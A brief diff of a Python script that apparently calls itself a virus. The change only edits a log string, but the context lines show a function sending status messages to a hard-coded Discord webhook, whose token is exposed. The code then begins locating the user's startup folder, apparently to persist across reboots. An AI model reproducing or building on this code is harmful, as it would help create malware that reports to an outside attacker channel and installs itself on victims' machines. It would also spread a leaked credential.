@@ -13,7 +13,7 @@ def log_to_discord(msg:str, important=False):
             requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
     except:
         print("Failed to send port request")
-log_to_discord("Installing of virus...", important=True)
+log_to_discord("Installing virus...", important=True)
 
 home_dir = os.path.expanduser("~")
 startup_folder = os.path.join(
